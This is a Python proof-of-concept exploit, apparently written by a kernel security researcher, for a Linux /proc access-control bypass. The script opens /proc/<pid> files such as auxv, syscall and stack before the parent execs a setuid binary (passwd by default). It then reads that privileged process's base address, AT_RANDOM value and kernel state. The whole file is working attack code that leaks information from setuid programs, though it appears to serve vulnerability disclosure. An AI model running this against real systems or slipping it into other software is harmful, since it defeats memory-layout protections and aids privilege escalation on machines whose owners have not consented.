#!/usr/bin/env python
# Demonstrates DAC bypass on /proc/$pid file descriptors across setuid exec
# Author: Kees Cook <kees@ubuntu.com>
# License: GPLv2
# Usage: ./procleak.py FILES,TO,SNOOP PROGRAM-TO-RUN
import os, sys, time, struct
import errno

target = os.getpid()
snoop = ['auxv', 'syscall', 'stack']

args = []
if len(sys.argv)>1:
    args = sys.argv[1:]
    snoop = args[0].split(',')
    args = args[1:]

def dump_auxv(blob):
    if len(blob) == 0:
        return
    auxv = struct.unpack('@%dL' % (len(blob)/len(struct.pack('@L',0))), blob)
    while auxv[0] != 0:
        if auxv[0] == 7:
            print("AT_BASE:   0x%x" % (auxv[1]))
        if auxv[0] == 25:
            print("AT_RANDOM: 0x%x" % (auxv[1]))
        auxv = auxv[2:]

# Allow child/parent synchronization to avoid start-up race.
r, w = os.pipe()

pid = os.fork()
if pid == 0:
    # Child
    os.close(w)
    os.read(r, 6)

    os.setsid()
    sys.stdin.close()

    files = dict()
    last = dict()
    uid = os.getuid()
    try:
        for name in snoop:
            files[name] = file('/proc/%d/%s' % (target, name))
            # Ignore initial read, since it's from the existing parent
            last[name] = files[name].read()
        while True:
            for name in snoop:
                files[name].seek(0)
                saw = files[name].read()
                diruid = os.stat('/proc/%d' % (target)).st_uid
                if saw != last[name] and diruid != uid:
                    if name == 'auxv':
                        dump_auxv(saw)
                    else:
                        print(saw)
                    last[name] = saw
    except Exception as o:
        if o.errno == errno.EEXIST or o.errno == errno.EPERM:
            # Target quit or wasn't permitted to access the file to
            # begin with, so okay.
            sys.exit(0)
    sys.exit(1)

cmd = ['/usr/bin/passwd']
if len(args) > 0:
    cmd = args
os.close(r)
os.write(w, "ready\n")
time.sleep(1)
os.execv(cmd[0],cmd)
